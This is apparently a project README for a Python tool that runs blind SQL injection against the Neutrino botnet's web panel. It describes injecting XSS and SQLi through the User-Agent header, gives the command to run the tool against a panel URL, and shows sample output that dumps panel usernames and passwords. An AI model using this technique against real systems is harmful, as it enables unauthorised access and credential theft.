# NeutrinoBotHack
Blind SQL injection in Neutrino panel

## Neutrino now uses POST request, but just as badly as before.
They added a 'ban' feature that blocks you upon ANY invalid request, meaning you can no longer abuse the POST variable 'ip'.
You can still set your ip via this variable however and can XSS and blind SQLi inject via the 'user-agent' header in the same request, this adds you to the banned list, with your ip set as the 'ip' variable.

This module fills in your ip as a random number and completes requests with a binary search rather than brute-forcing. 
This means less requests, less noise and takes less time.


### Usage
This module requires the python [Requests](http://docs.python-requests.org/en/master/# "Requests doc page") module.

**Install**
```
pip install requests
```

**Use**
```
python neutrino.py http://panel-url-or-ip/
```


### Example
```
python neutrino.py http://127.0.0.1/
No. of users: 3


Username:
admin
Password:
admin

Username:
secretuser
Password:
SeceretPass1

Username:
user
Password:
mypass

Number of requests made: 582
Time taken: 147 seconds

Requests per second: 3
```
![alt tag](https://raw.githubusercontent.com/LordDannyBoi/NeutrinoBotHack/master/example.png)
